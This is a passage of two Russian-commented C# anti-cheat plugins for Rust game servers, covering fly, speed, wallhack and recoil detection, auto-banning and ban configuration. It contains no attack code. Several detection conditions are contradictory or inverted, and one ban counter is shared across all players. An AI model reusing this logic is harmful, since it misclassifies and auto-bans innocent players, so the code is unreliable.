                    LastAttack = GrabCurrentTime();
                }
            }
            catch (NullReferenceException) { }
            return null;
        }
        [ChatCommand("ac")]
        void cmdChatDetect(BasePlayer player, string command, string[] args)
        {
            if (!player || !permission.UserHasPermission(player.UserIDString, "anticheat.toggleadmin"))
            {
                SendReply(player, "У вас нету привилегии использовать эту команду");
                return;
            }
            if (adata.AdminData.ContainsKey(player.userID))
            {
                if (adata.AdminData[player.userID].Check)
                {
                    adata.AdminData[player.userID].Check = adata.AdminData[player.userID].Check = false;
                    SendReply(player, "Админ дебаг выключен. Вас не детектит.");
                    return;
                }
                else
                {
                    adata.AdminData[player.userID].Check = adata.AdminData[player.userID].Check = true;
                    SendReply(player, "Админ дебаг включен. Вас детектит.");
                }
            }
            else
            {
                SendReply(player, "Вас нету в базе администраторов, пожалуйста перезейдите!");
            }
        }
        [HookMethod("AimCheck")]
        private void AimCheck(ConsoleSystem.Arg arg)
        {
            if (arg.Player() != null && !arg.Player().IsAdmin && !arg.Player())
            {
                return;
            }
            if (arg.Args == null || arg.Args.Length < 1)
            {
                arg.ReplyWith("Неверный синтаксис! Используйте aim.check <SteamID>");
                return;
            }
            if (arg.Args.Length == 1)
            {
                ulong FindPlayer;
                if (!ulong.TryParse(arg.Args[0], out FindPlayer))
                {
                    arg.ReplyWith("Нужно ввести SteamID игрока!");
                    return;
                }
                var check = PlayersListed.ContainsKey(FindPlayer);
                if (check)
                {
                    var target = PlayersListed[FindPlayer];
                    double aim = target.Hits > 0 ? target.Heads > 0 ? target.Hits / target.Heads * 100 : 0 : 0;
                    arg.ReplyWith($"[Анти-чит] {target.Name}: Aim: {aim}% при {target.Hits} попаданиях (с растояния 10 метров и выше)");
                }
                else
                {
                    arg.ReplyWith("Игрока не найдено!");
                }
            }
            return;
        }
        [HookMethod("AimCheckServer")]
        private void AimCheckServer(ConsoleSystem.Arg arg)
        {
            if (arg.Player() != null && !arg.Player().IsAdmin)
            {
                return;
            }
            double popa = 0;
            double head = 0;
            var Top = (from x in PlayersListed select x);
            foreach (var top in Top)
            {
                popa = popa + top.Value.Hits;
                head = head + top.Value.Heads;
            }
            arg.ReplyWith($"[Анти-чит]: В голову попадают в {Math.Floor((head * 1f / popa * 1f) * 100f)}% случаев (с растояния 10 метров и выше)");
            return;
        }
        [HookMethod("CheckServer")]
        private void CheckServer(ConsoleSystem.Arg arg)
        {
            if (arg.Player() != null && !arg.Player().IsAdmin)
            {
                return;
            }
            int i = 0;
            string players = "";
            var reply = 5699;
            if (reply == 0) { }
            double popa = 0;
            double head = 0;
            string aimdesc = "";
            var Top = (from x in PlayersListed select x);
            foreach (var top in Top)
            {
                popa = popa + top.Value.Hits;
                head = head + top.Value.Heads;
            }
            double aimserver = Math.Floor((head * 1f / popa * 1f) * 100f);
            players = "----------------------------------Игроки---------------------------------- \n";
            foreach (var player in BasePlayer.activePlayerList)
            {
                if (PlayersListed.ContainsKey(player.userID))
                {
                    var playerKey = PlayersListed[player.userID];
                    if (playerKey.Deaths == 0) playerKey.Deaths = 1;
                    if (playerKey.Hits == 0) playerKey.Hits = 1;
                    double aimprocent = Math.Floor((playerKey.Heads * 1f / playerKey.Hits * 1f) * 100f);
                    double kdr = Math.Round(playerKey.Killed * 1f / playerKey.Deaths * 1f, 2);
                    double razn = aimserver - aimprocent;
                    if (playerKey.Hits < 30 || playerKey.Killed < 10)
                    {
                        aimdesc = "Новый игрок";
                    }
                    else if (razn > -5 && razn > 5 && kdr < 2)
                    {
                        aimdesc = "Простой игрок";
                    }
                    else if (razn > -5 && razn > 5 && kdr < 3)
                    {
                        aimdesc = "Подозрительный игрок";
                    }
                    else if (razn > -5 && razn > 5 && kdr >= 3)
                    {
                        aimdesc = "Очень подозрительный игрок";
                    }
                    else if (razn > -5 && razn < -8 && kdr < 2)
                    {
                        aimdesc = "Игрок с хорошей точностью в голову";
                    }
                    else if (razn > -5 && razn < -8 && kdr < 3)
                    {
                        aimdesc = "Скилловый игрок";
                    }
                    else if (razn > -5 && razn < -8 && kdr < 4)
                    {
                        aimdesc = "Подозрительный игрок";
                    }
                    if (razn > -5 && razn < -8 && kdr >= 4)
                    {
                        aimdesc = "Читер";
                    }
                    else if (razn > 5 && razn < 8 && kdr < 1)
                    {
                        aimdesc = "Игрок со слабым скиллом";
                    }
                    else if (razn > 5 && razn < 8 && kdr < 2)
                    {
                        aimdesc = "Подозрительный игрок";
                    }
                    else if (razn > 5 && razn < 8 && kdr < 3)
                    {
                        aimdesc = "Очень подозрительный игрок";
                    }
                    if (razn > 5 && razn < 8 && kdr >= 4)
                    {
                        aimdesc = "Читер";
                    }
                    i++;
                    players = players + $"{i}. {player.displayName} ({player.userID}) | aim: {aimprocent}% | kdr {kdr} | {aimdesc} \n";
                }
            }
            arg.ReplyWith(players + "-------------------------------------------------------------------------------");
        }
        void Unload()
        {
            DestroyAll<PlayerHack>();
            SavePlayerData();
            SaveDataAdmin();
        }
        void DestroyAll<T>()
        {
            UnityEngine.Object[] objects = GameObject.FindObjectsOfType(typeof(T));
            if (objects != null) foreach (UnityEngine.Object gameObj in objects) GameObject.Destroy(gameObj);
        }
        void OnPlayerConnected(BasePlayer player)
        {
            if (player == null) return;
            if (player.IsAdmin || permission.UserHasPermission(player.UserIDString, "anticheat.toggleadmin"))
            {
                if (!adata.AdminData.ContainsKey(player.userID))
                {
                    adata.AdminData.Add(player.userID, new ADMINDATA()
                    {
                        Name = player.displayName,
                        Check = false,
                    }
                    );
                }
                else
                {
                    adata.AdminData[player.userID].Name = player.displayName;
                }
                if (adata.AdminData[player.userID].Check) SendReply(player, "<color=RED>Внимание!</color> У вас включен админ дебаг. Советуем его отключить (/ac)");
            }
            else if (adata.AdminData.ContainsKey(player.userID)) if (!player.IsAdmin || !permission.UserHasPermission(player.UserIDString, "anticheat.toggleadmin"))
                {
                    adata.AdminData[player.userID].Check = adata.AdminData[player.userID].Check = true;
                }
            if (!PlayersListed.ContainsKey(player.userID)) CreateInfo(player);
            else
            {
                if (player.displayName != PlayersListed[player.userID].Name) PlayersListed[player.userID].Name = player.displayName;
            }
            new PluginTimers(this).Once(2f, () => CheckFLY(player));
            timer.Once(1f, () => RefreshPlayer(player));
        }
        void RefreshPlayer(BasePlayer player)
        {
            if (player.GetComponent<PlayerHack>() == null) player.gameObject.AddComponent<PlayerHack>();
        }
        private void AutoBan(BasePlayer player, string reason)
        {
            if (b == DetectCountFSH)
            {
                Ban(player.userID, "По поводу разбана писать dczalupa.");
                LogToFile("ban", $"[{DateTime.Now.ToShortTimeString()}] -  Ban: Reason - {reason} {player.displayName}({player.UserIDString}) забанен! Количество детектов привысило заданный предел.  Предупреждений: {b + 1}", this, true);
            }
        }
        private void CheckFLY(BasePlayer player)
        {
            if (player == null) return;
            if (!player.IsConnected) return;
            var position = player.transform.position;
            int f = 0;
            new PluginTimers(this).Repeat(2f, 0, () => {
                if (!player.IsConnected) return;
                if (adata.AdminData.ContainsKey(player.userID))
                {
                    if (!adata.AdminData[player.userID].Check) return;
                }
                if (player.IsFlying && !player.IsSwimming() && !player.IsDead() && !player.IsSleeping() && !player.IsWounded())
                {
                    f++;
                    if (f >= 1)
                    {
                        if (b == DetectCountFSH && FHEnabled)
                        {
                            AutoBan(player, "FlyHack");
                        }
                        else
                        {
                            if (FHKickEnabled)
                            {
                                Kick(player, "Э ты чо литаеш");
                                Debug.LogError($"[Анти-чит], {player.displayName}, ({player.UserIDString}) кикнут! Причина: FlyHack!");
                                LogToFile("log", $"[{DateTime.Now.ToShortTimeString()}] - (FlyHack) Игрок {player.displayName}({player.UserIDString}) кикнут! Слишком долго находился в воздухе! Предупреждений: {b + 1}", this, true);
                            }
                            SendDetection(player, string.Format("<color=#ffa500>[Античит детект]</color> " + "(FLYHack) Игрок" + player.displayName + $" Слишком долго находиться в воздухе! Предупреждений: {b + 1}"));
                            var messages = $"Обнаружен FlyHack Предупреждений: {b + 1}";
                            Debug.LogWarning($"[Анти-чит] {player.displayName}({player.UserIDString}) Обнаружен FlyHack Предупреждений: {b + 1}");
                            LogToFile("log", $"[{DateTime.Now.ToShortTimeString()}] - (FlyHack) У игрок {player.displayName}({player.UserIDString}) обнаружен FlyHack Предупреждений: {b + 1}", this, true);
                            b++;
                            return;
                        }
                    }
                }
                else
                {
                    f = 0;
                }
            }
            );
        }
        public class PlayerHack : MonoBehaviour
        {
            public BasePlayer player;
            public Vector3 lastPosition;
            public Vector3 currentDirection;
            public bool isonGround;
            public float Distance3D;
            public float VerticalDistance;
            public float deltaTick;
            public float speedHackDetections = 0f;
            public double currentTick;
            public double lastTick;
            public double lastTickFly;
            public double lastTickSpeed;
            void Awake()
            {
                player = GetComponent<BasePlayer>();
                InvokeRepeating("CheckPlayer", 1f, 1f);
                lastPosition = player.transform.position;
            }
            static DateTime epoch = new DateTime(1970, 1, 1, 0, 0, 0);
            static double CurrentTime()
            {
                return DateTime.UtcNow.Subtract(epoch).TotalMilliseconds;
            }
            static List<PlayerHack> fpsCalled = new List<PlayerHack>();
            static double fpsTime;
            static bool fpsCheckCalled = false;
            static void CheckForHacks(PlayerHack hack)
            {
                CheckForSpeedHack(hack);
            }
            static int fpsIgnore = 30;
            void CheckPlayer()
            {
                if (!player.IsConnected) GameObject.Destroy(this);
                currentTick = CurrentTime();
                deltaTick = (float)((currentTick - lastTick) / 1000.0);
                Distance3D = Vector3.Distance(player.transform.position, lastPosition) / deltaTick;
                VerticalDistance = (player.transform.position.y - lastPosition.y) / deltaTick;
                currentDirection = (player.transform.position - lastPosition).normalized;
                isonGround = player.IsOnGround();
                if (!player.IsWounded() && !player.IsDead() && !player.IsSleeping() && deltaTick < 1.1f && Performance.current.frameRate > fpsIgnore) CheckForHacks(this);
                lastPosition = player.transform.position;
                if (fpsCheckCalled) if (!fpsCalled.Contains(this))
                    {
                        fpsCalled.Add(this);
                        fpsTime += (CurrentTime() - currentTick);
                    }
                lastTick = currentTick;
            }
        }
        static float minSpeedPerSecond = 10f;
        static double LogTime()
        {
            return DateTime.UtcNow.Subtract(epoch).TotalSeconds;
        }
        static Vector3 lastGroundPosition;
        static void CheckForSpeedHack(PlayerHack hack)
        {
            if (instance.adata.AdminData.ContainsKey(hack.player.userID))
            {
                if (!instance.adata.AdminData[hack.player.userID].Check) return;
            }
            RaycastHit hit;
            if (Physics.Raycast(hack.player.transform.position, Vector3.down, out hit, LayerMask.GetMask("Construction")))
            {
                if (hit.transform.position != lastGroundPosition) return;
                lastGroundPosition = hit.transform.position;
            }
            if (hack.Distance3D < minSpeedPerSecond) return;
            if (hack.VerticalDistance < -8f) return;
            if (hack.lastTickSpeed == hack.lastTick)
            {
                if (hack.player.IsSwimming() && hack.player.IsDead() && hack.player.IsSleeping() && hack.player.IsWounded()) return;
                if (hack.player.GetMounted()) return;
                hack.speedHackDetections++;
                if (instance.SHEnable)
                {
                    if (hack.player.IsOnGround())
                    {
                        if (b == instance.DetectCountFSH && instance.SHEnabled)
                        {
                            instance.AutoBan(hack.player, "SpeedHack");
                            instance.LogToFile("ban", $"[{DateTime.Now.ToShortTimeString()}] - (Speedhack) Игрок {hack.player.displayName}({hack.player.UserIDString}) забанен! Двигался со скоростью выше нормы. Предупреждений: {b + 1}", AntiCheat.instance, true);
                        }
                        else
                        {
                            if (instance.SHKickEnabled)
                            {
                                instance.Kick(hack.player, "Слишкам бистри");
                                Debug.LogError($"[Анти-чит] {hack.player.displayName}({hack.player.UserIDString}) кикнут! Причина: SpeedHack!");
                            }
                            var messages = $"Обнаружен Speedhack ({hack.Distance3D.ToString()} м/с) Предупреждений: {b + 1}";
                            instance.LogToFile("log", $"[{DateTime.Now.ToShortTimeString()}] - (Speedhack) Игрок {hack.player.displayName}({hack.player.UserIDString}) двигаеться со скоростью выше нормы. Предупреждений: {b + 1}", AntiCheat.instance, true);
                            instance.SendDetection(hack.player, string.Format($"<color=#ffa500>[Античит детект]</color> (SPEEDHack) Игрок {hack.player.displayName}({hack.player.UserIDString}) двигаеться со скоростью выше нормы. Предупреждений: {b + 1}"));
                            UnityEngine.Debug.LogError($"[Анти-чит] Игрок {hack.player.displayName}({hack.player.UserIDString}) двигаеться со скоростью выше нормы. Предупреждений: {b + 1}");
                            b++;
                        }
                    }
                }
            }
            else
            {
                hack.speedHackDetections = 0f;
            }
            hack.lastTickSpeed = hack.currentTick;
        }
        static int bulletmask;
        static DamageTypeList emptyDamage = new DamageTypeList();
        static Vector3 VectorDown = new Vector3(0f, -1f, 0f);
        static Hash<BasePlayer, float> lastWallhack = new Hash<BasePlayer, float>();
        Hash<ulong, ColliderCheckTest> playerWallcheck = new Hash<ulong, ColliderCheckTest>();
        static RaycastHit cachedRaycasthit;
        [HookMethod("WallhackKillCheck")]
        private void WallhackKillCheck(BasePlayer player, BasePlayer attacker, HitInfo hitInfo)
        {
            if (adata.AdminData.ContainsKey(player.userID))
            {
                if (adata.AdminData[player.userID].Check == false) return;
            }
            if (Physics.Linecast(attacker.eyes.position, hitInfo.HitPositionWorld, out cachedRaycasthit, bulletmask))
            {
                BuildingBlock block = cachedRaycasthit.collider.GetComponentInParent<BuildingBlock>();
                if (block != null)
                {
                    if (block.blockDefinition.hierachyName == "wall.window") return;
                    CancelDamage(hitInfo);
                    if (Time.realtimeSinceStartup - lastWallhack[attacker] > 0.5f)
                    {
                        lastWallhack[attacker] = Time.realtimeSinceStartup;
                        UnityEngine.Debug.LogError($"WalhackAttack обнаружен у {player.displayName}");
                        LogToFile("log", $"[{DateTime.Now.ToShortTimeString()}] - (WalhackAttack) {player.displayName}({player.UserIDString}) нанес урон через препятствие!", this, true);
                        SendDetection(player, string.Format("<color=#ffa500>[Античит детект]</color> " + "(WalhackAttack) " + player.displayName + " нанес урон через препятствие!"));
                    }
                }
            }
        }
        private void CancelDamage(HitInfo hitinfo)
        {
            hitinfo.damageTypes = emptyDamage;
            hitinfo.HitEntity = null;
        }
        private readonly Dictionary<ulong, NoRecoilData> data = new Dictionary<ulong, NoRecoilData>();
        private readonly Dictionary<ulong, Timer> detections = new Dictionary<ulong, Timer>();
        private readonly int detectionDiscardSeconds = 300;
        private readonly int violationProbability = 30;
        private readonly int maximumViolations = 30;
        private readonly Dictionary<string, int> probabilityModifiers = new Dictionary<string, int>() {
                {
                "weapon.mod.muzzleboost", -5
            }
            , {
                "weapon.mod.silencer", -5
            }
            , {
                "weapon.mod.holosight", -5
            }
            , {
                "crouching", -8
            }
            , {
                "aiming", -5
            }
        }
        ;
        private readonly List<string> blacklistedAttachments = new List<string>() {
            "weapon.mod.muzzlebreak", "weapon.mod.silencer", "weapon.mod.small.scope"
        }
        ;
        public class NoRecoilData
        {
            public int Ticks = 0;
            public int Count;
            public int Violations;
        }
        void OnWeaponFired(BaseProjectile projectile, BasePlayer player, ItemModProjectile mod, ProjectileShoot projectiles)
        {
            if (!AntiRecoilEnabled) return;
            if (player == null) return;
            if (IsNPC(player)) return;
            if (adata.AdminData.ContainsKey(player.userID)) if (!adata.AdminData[player.userID].Check) return;
            var item = player.GetActiveItem();
            if (item == null) return;
            if (!(ListWeapons.Contains(item.info.shortname))) return;
            var counts = 0;
            foreach (Item attachment in item.contents.itemList) if (attachment.info.shortname == "weapon.mod.muzzlebrake" || attachment.info.shortname == "weapon.mod.holosight") counts++;
            if (counts == 2) return;
            if (item.contents.itemList.Any(x => blacklistedAttachments.Contains(x.info.shortname))) return;
            NoRecoilData info;
            if (!data.TryGetValue(player.userID, out info)) data.Add(player.userID, info = new NoRecoilData());
            Vector3 eyesDirection = player.eyes.HeadForward();
            if (eyesDirection.y < -0.80) return;
            info.Ticks++;
            int probModifier = 0;
            foreach (Item attachment in item.contents.itemList) if (probabilityModifiers.ContainsKey(attachment.info.shortname)) probModifier += probabilityModifiers[attachment.info.shortname];
            if (player.modelState.aiming && probabilityModifiers.ContainsKey("aiming")) probModifier += probabilityModifiers["aiming"];
            if (player.IsDucked() && probabilityModifiers.ContainsKey("crouching")) probModifier += probabilityModifiers["crouching"];
            Timer detectionTimer;
            if (detections.TryGetValue(player.userID, out detectionTimer)) detectionTimer.Reset(detectionDiscardSeconds);
            else detections.Add(player.userID, timer.Once(detectionDiscardSeconds, delegate () {
                if (info.Violations > 0) info.Violations--;
            }
            ));
            timer.Once(0.5f, () => {
                ProcessRecoil(projectile, player, mod, projectiles, info, probModifier, eyesDirection);
            }
            );
        }
        private void ProcessRecoil(BaseProjectile projectile, BasePlayer player, ItemModProjectile mod, ProjectileShoot projectileShoot, NoRecoilData info, int probModifier, Vector3 eyesDirection)
        {
            if (projectile == null || player == null || mod == null || projectileShoot == null || info == null || eyesDirection == null) return;
            var nextEyesDirection = player.eyes.HeadForward();
            if (Math.Abs(nextEyesDirection.y - eyesDirection.y) < .009 && nextEyesDirection.y < .8) info.Count++;
            if (info.Ticks <= 10) return;
            var prob = 100 * info.Count / info.Ticks;
            var item = player.GetActiveItem();
            if (prob > ((100 - violationProbability) + probModifier))
            {
                if (prob > 100) prob = 100;
                if (prob < DetectPerMacros) return;
                info.Violations++;
                Debug.LogError("(Макрос) " + player.displayName + ": вероятность " + string.Format("{0}", prob) + "% | обнаружений " + info.Violations.ToString() + ".");
                SendDetection(player, string.Format("<color=#ffa500>[Античит детект]</color> " + "(NoRecoil) " + "У игрока " + player.displayName + " обнаружен NoRecoil " + ",вероятность " + string.Format("{0}", prob) + "% | обнаружений " + info.Violations.ToString()));
                LogToFile("log", $"[{DateTime.Now.ToShortTimeString()}] - (Макрос) " + player.displayName + ": вероятность " + string.Format("{0}", prob) + "% | обнаружений " + info.Violations.ToString() + " | " + item.info.shortname, this, true);
                if (info.Violations > DetectCountMacros && MCREnabled)
                {
                    Ban(player.userID, "По разбану писать dczalupa");
                    LogToFile("ban", $"[{DateTime.Now.ToShortTimeString()}] - (Макрос) Игрок" + player.displayName + "забанен. Вероятность " + string.Format("{0}", prob) + "% | обнаружений " + info.Violations.ToString() + " | " + item.info.shortname, this, true);
                }
            }
            info.Ticks = 0;
            info.Count = 0;
        }
        static Hash<BasePlayer, int> wallhackDetec = new Hash<BasePlayer, int>();
        public class ColliderCheckTest : MonoBehaviour
        {
            public BasePlayer player;
            Hash<Collider, Vector3> entryPosition = new Hash<Collider, Vector3>();
            SphereCollider col;
            public float teleportedBack;
            public Collider lastCollider;
            void Awake()
            {
                player = transform.parent.GetComponent<BasePlayer>();
                col = gameObject.AddComponent<SphereCollider>();
                col.radius = 0.1f;
                col.isTrigger = true;
                col.center = new Vector3(0f, 0.5f, 0f);
            }
            public static BaseEntity GetCollEntity(Vector3 entry, Vector3 exist)
            {
                var rayArray = Physics.RaycastAll(exist, entry, Vector3.Distance(entry, exist), constructionColl);
                for (int i = 0;
                i < rayArray.Length;
                i++)
                {
                    return rayArray[i].GetEntity();
                }
                return null;
            }
            void OnTriggerExit(Collider col)
            {
                if (textureenable) if (entryPosition.ContainsKey(col))
                    {
                        BuildingBlock block = col.GetComponent<BuildingBlock>();
                        if (block != null)
                        {
                            if (!block.gameObject.name.Contains("foundation.steps") && !block.gameObject.name.Contains("block.halfheight.slanted"))
                            {
                                instance.SendDetection(player, string.Format($"{player.displayName},({player.userID}) Обнаружен TextureHack!"));
                                ForcePlayerBack(this, col, entryPosition[col], player.transform.position);
                                if (Time.realtimeSinceStartup - lastWallhack[player] < 10f)
                                {
                                    instance.SendDetection(player, string.Format($"{player.displayName},({player.userID}) Обнаружен WallHack! Детект № {wallhackDetec[player]}"));
                                    wallhackDetec[player]++;
                                    instance.LogToFile("log", $"[{DateTime.Now.ToShortTimeString()}] - (WallHack) {player.userID.ToString()} {player.displayName.ToString()} Обнаружен WallHack! Обнаружений {wallhackDetec[player]}", AntiCheat.instance, true);
                                }
                                lastWallhack[player] = Time.realtimeSinceStartup;
                            }
                        }
                        entryPosition.Remove(col);
                    }
            }
            void OnDestroy()
            {
                Destroy(gameObject);
                Destroy(col);
            }
        }
        static void ForcePlayerBack(ColliderCheckTest colcheck, Collider collision, Vector3 entryposition, Vector3 exitposition)
        {
            Vector3 rollBackPosition = GetRollBackPosition(entryposition, exitposition, 4f);
            Vector3 rollDirection = (entryposition - exitposition).normalized;
            foreach (RaycastHit rayhit in UnityEngine.Physics.RaycastAll(rollBackPosition, (exitposition - entryposition).normalized, 5f))
            {
                if (rayhit.collider == collision)
                {
                    rollBackPosition = rayhit.point + rollDirection * 1f;
                }
            }
            colcheck.teleportedBack = Time.realtimeSinceStartup;
            colcheck.lastCollider = collision;
            ForcePlayerPosition(colcheck.player, rollBackPosition);
        }
        static Vector3 GetRollBackPosition(Vector3 entryposition, Vector3 exitposition, float distance)
        {
            distance = Vector3.Distance(exitposition, entryposition) + distance;
            var direction = (entryposition - exitposition).normalized;
            return (exitposition + (direction * distance));
        }
        new static void ForcePlayerPosition(BasePlayer player, Vector3 destination)
        {
            player.MovePosition(destination);
            player.ClientRPCPlayer(null, player, "ForcePositionTo", destination);
        }
        [HookMethod("OnBasePlayerAttacked")]
        private void OnBasePlayerAttacked(BasePlayer player, HitInfo hitInfo)
        {
            if (player.IsDead()) return;
            if (hitInfo.Initiator == null) return;
            if (player.health - hitInfo.damageTypes.Total() > 0f) return;
            BasePlayer attacker = hitInfo.Initiator.ToPlayer();
            if (attacker == null) return;
            if (attacker == player) return;
            WallhackKillCheck(player, attacker, hitInfo);
        }
        public static void msgPlayer(BasePlayer player, string msg)
        {
            player.ChatMessage($"[Анти-Чит] {msg}");
        }
        public static void msgAll(string msg)
        {
            ConsoleNetwork.BroadcastToAllClients("chat.add", 0, $"[Анти-Чит] {msg}");
        }
        private void CreateInfo(BasePlayer player)
        {
            if (player == null) return;
            if (!PlayersListed.ContainsKey(player.userID)) PlayersListed.Add(player.userID, new PlayerAntiCheat()
            {
                Deaths = 0,
                Killed = 0,
                Heads = 0,
                Hits = 0,
                Name = player.displayName
            }
            );
        }
        private void SaveDataAdmin()
        {
            Interface.GetMod().DataFileSystem.WriteObject("AntiCheat/AdminData", adata);
        }
        private void SavePlayerData()
        {
            Interface.Oxide.DataFileSystem.WriteObject("AntiCheat/PlayerAntiCheat", PlayersListed);
        }
        void SendDetection(BasePlayer player, string msg)
        {
            if (SendsLogs) if (permission.UserHasPermission(player.UserIDString, "anticheat.sendlogs")) SendReply(player, msg);
        }
        public Dictionary<ulong, PlayerAntiCheat> PlayersListed = new Dictionary<ulong, PlayerAntiCheat>();
        public class PlayerAntiCheat
        {
            public string Name
            {
                get;
                set;
            }
            public int Killed
            {
                get;
                set;
            }
            public int Deaths
            {
                get;
                set;
            }
            public int Hits
            {
                get;
                set;
            }
            public int Heads
            {
                get;
                set;
            }
            public bool Banned;
            public string Date;
            public string Reason;
            public string BanCreator;
        }
    }
}

###ВТОРОЙ ПЛАГИН НА АНТИЧИТ###

using System;
using System.Collections.Generic;
using Facepunch;
using Newtonsoft.Json;
using Oxide.Core.Plugins;
using System.Linq;
using UnityEngine;
using Oxide.Core;
using Random = UnityEngine.Random;
using Rust;
using ProtoBuf;
using System.Collections;
using System.Text.RegularExpressions;
using Oxide.Core.Libraries;

namespace Oxide.Plugins
{
    [Info("XAntiCheat", "fermens", "2.0.0")]
    public class XAntiCheat : RustPlugin
    {
        static XAntiCheat fermens;
        const bool fermensEN = false;

        const bool debugmode = false;
        const string ipinnfourl = "https://ipinfo.io/{ip}/privacy?token={token}";
        const bool enablefull = true;
        const string ipinfosingup = "https://ipinfo.io/signup";

        #region message
        Dictionary<string, string> messages = new Dictionary<string, string>();
        private string GetMessage(string key, string userId)
        {
            return lang.GetMessage(key, this, userId);
        }
        #endregion

        #region CODE LOCK
        private static bool IsBanned(ulong userid)
        {
            return ServerUsers.Is(userid, ServerUsers.UserGroup.Banned);
        }

        private static bool IsImprisoned(ulong userid)
        {
            if (fermens.PrisonBitch == null) return false;
            return fermens.PrisonBitch.Call<bool>("ISIMPRISONED", userid);
        }

        private void OnCodeEntered(CodeLock codeLock, BasePlayer player, string code)
        {
            if (player == null) return;
            ulong owner = codeLock.OwnerID;
            if (owner == 0UL || code != codeLock.code) return;
            if (!codeLock.IsLocked())
            {
                codeLock.OwnerID = player.userID;
                return;
            }
            bool bann = IsBanned(owner);
            bool unprisoned = IsImprisoned(owner);

            if (bann || unprisoned)
            {
                ADDLOG("CODELOCK", messages["logCODELOCK"].Replace("{name}", player.displayName).Replace("{steamid}", player.UserIDString).Replace("{owner}", owner.ToString()), config.cODELOCK.webhook, 2);
                if (config.cODELOCK.enable)
                {
                    timer.Once(config.cODELOCK.seconds, () =>
                    {
                        BAN(player.UserIDString, config.cODELOCK.reason, config.cODELOCK.hours, player.displayName, config.cODELOCK.webhook);
                    });
                }
            }

        }

        object CanChangeCode(BasePlayer player, CodeLock codeLock, string newCode, bool isGuestCode)
        {
            codeLock.OwnerID = player.userID;
            return null;
        }
        #endregion

        #region КОНФИГ
        private static PluginConfig config;

        protected override void LoadDefaultConfig()
        {
            config = PluginConfig.DefaultConfig();
        }
        protected override void LoadConfig()
        {
            base.LoadConfig();
            config = Config.ReadObject<PluginConfig>();
        }
        protected override void SaveConfig()
        {
            Config.WriteObject(config);
        }

        class SILENT
        {
            [JsonProperty(fermensEN ? "Enable autoban?" : "Банить?")]
            public bool enable;

            [JsonProperty(fermensEN ? "Number of detections for a ban" : "Автобан (не знаешь, не трогай!)")]
            public int xdetects;

            [JsonProperty(fermensEN ? "Ban reason" : "Причина бана")]
            public string reason;

            [JsonProperty("Discord Webhook")]
            public string webhook;

            [JsonProperty(fermensEN ? "How many hours to ban?" : "На сколько часов бан?")]
            public int hours;
        }

        class SPIDER
        {
            [JsonProperty(fermensEN ? "Enable autoban?" : "Банить?")]
            public bool enable;

            [JsonProperty(fermensEN ? "Ban reason" : "Причина бана")]
            public string reason;

            [JsonProperty("Discord Webhook")]
            public string webhook;

            [JsonProperty(fermensEN ? "How many hours to ban?" : "На сколько часов бан?")]
            public int hours;
        }

        class FLY
        {
            [JsonProperty(fermensEN ? "Enable autoban?" : "Банить?")]
            public bool enable;

            [JsonProperty(fermensEN ? "Ban reason" : "Причина бана")]
            public string reason;

            [JsonProperty("Discord Webhook")]
            public string webhook;

            [JsonProperty(fermensEN ? "How many hours to ban?" : "На сколько часов бан?")]
            public int hours;
        }

        class SPINERBOT
        {
            [JsonProperty(fermensEN ? "Enable autoban?" : "Банить?")]
            public bool enable;

            [JsonProperty(fermensEN ? "Ban reason" : "Причина бана")]
            public string reason;

            [JsonProperty("Discord Webhook")]
            public string webhook;

            [JsonProperty(fermensEN ? "How many hours to ban?" : "На сколько часов бан?")]
            public int hours;
        }

        class NORECOIL
        {
            [JsonProperty(fermensEN ? "Enable autoban?" : "Банить?")]
            public bool enable;

            [JsonProperty(fermensEN ? "Ban reason" : "Причина бана")]
            public string reason;

            [JsonProperty(fermensEN ? "Delay in seconds before the ban" : "Задержка в секундах перед баном, после детекта")]
            public float seconds;

            [JsonProperty("Discord Webhook")]
            public string webhook;

            [JsonProperty(fermensEN ? "How many hours to ban?" : "На сколько часов бан?")]
            public int hours;
        }

        class HITMOD
        {
            [JsonProperty(fermensEN ? "Enable autoban?" : "Банить?")]
            public bool enable;

            [JsonProperty(fermensEN ? "Ban reason" : "Причина бана")]
            public string reason;

            [JsonProperty("Discord Webhook")]
            public string webhook;

            [JsonProperty(fermensEN ? "How many hours to ban?" : "На сколько часов бан?")]
            public int hours;
        }

        class CODELOCK
        {
            [JsonProperty(fermensEN ? "Enable autoban?" : "Банить?")]
            public bool enable;

            [JsonProperty(fermensEN ? "Ban reason" : "Причина бана")]
            public string reason;

            [JsonProperty("Discord Webhook")]
            public string webhook;

            [JsonProperty(fermensEN ? "Delay in seconds before the ban" : "Задержка в секундах перед баном, после детекта")]
            public float seconds;

            [JsonProperty(fermensEN ? "How many hours to ban?" : "На сколько часов бан?")]
            public int hours;
        }

        class TEAMBAN
        {
            [JsonProperty(fermensEN ? "Enable autoban?" : "Банить?")]
            public bool enable;

            [JsonProperty(fermensEN ? "Ban reason" : "Причина бана")]
            public string reason;

            [JsonProperty("Discord Webhook")]
            public string webhook;

            [JsonProperty(fermensEN ? "Ban if there are N bans in the team" : "Банить, если в команде N забаненных")]
            public int num;

            [JsonProperty(fermensEN ? "How many hours to ban?" : "На сколько часов бан?")]
            public int hours;
        }

        class ESPSTASH
        {
            [JsonProperty(fermensEN ? "Number of stashs" : "Количество")]
            public int amount;

            [JsonProperty("Discord Webhook")]
            public string webhook;

            [JsonProperty(fermensEN ? "Possible loot" : "Возможный лут")]
            public Dictionary<string, int> loots;
        }

        class DEBUGCAMERA
        {
            [JsonProperty(fermensEN ? "Enable autoban?" : "Банить?")]
            public bool enable;

            [JsonProperty("Discord Webhook")]
            public string webhook;
        }

        private class PluginConfig
        {
            [JsonProperty("-")]
            public string six;

            [JsonProperty("SteamAPI")]
            public string steampi;

            [JsonProperty(fermensEN ? "Silent Aim: setup" : "Silent Aim: настройка")]
            public SILENT sILENT;

            [JsonProperty(fermensEN ? "Spider: setup" : "Spider: настройка")]
            public SPIDER sPIDER;

            [JsonProperty(fermensEN ? "ESP SmallStash: setup" : "ESP SmallStash: настройка")]
            public ESPSTASH ESPStash;

            [JsonProperty(fermensEN ? "FLY: setup" : "FLY: настройка")]
            public FLY fLY;

            [JsonProperty(fermensEN ? "TEAMBAN: setup" : "TEAMBAN: настройка")]
            public TEAMBAN tEAMBAN;

            [JsonProperty(fermensEN ? "CODELOCK: setup" : "CODELOCK: настройка")]
            public CODELOCK cODELOCK;

            [JsonProperty(fermensEN ? "HITMOD: setup" : "HITMOD: настройка")]
            public HITMOD hITMOD;

            [JsonProperty(fermensEN ? "NORECOIL: setup" : "NORECOIL: настройка")]
            public NORECOIL nORECOIL;

